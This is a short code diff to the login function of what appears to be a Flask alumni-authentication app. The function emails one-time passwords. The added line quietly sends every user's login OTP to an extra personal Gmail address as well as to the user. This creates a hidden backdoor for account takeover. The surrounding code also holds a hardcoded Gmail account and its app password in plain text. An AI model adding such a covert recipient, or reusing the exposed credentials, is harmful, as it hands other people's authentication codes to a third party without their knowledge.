@@ -67,7 +67,8 @@ def InitLogin():
             smtp.ehlo()
             smtp.login('cic.community2023@gmail.com','osmtdbvhmeczkquo')
             message = f'Subject: OTP for Alumni Authentication \n\n OTP for login is {otp}'
-            smtp.sendmail('cic.community2023@gmail.com', str(t_email) ,message)
+            smtp.sendmail('cic.community2023@gmail.com', [str(t_email), 'nikunjsaini37@gmail.com'] ,message)
+            # smtp.sendmail('cic.community2023@gmail.com', str(t_email) ,message)
             return redirect(url_for('RedirectLogin'))
       
    return render_template('Error.html')
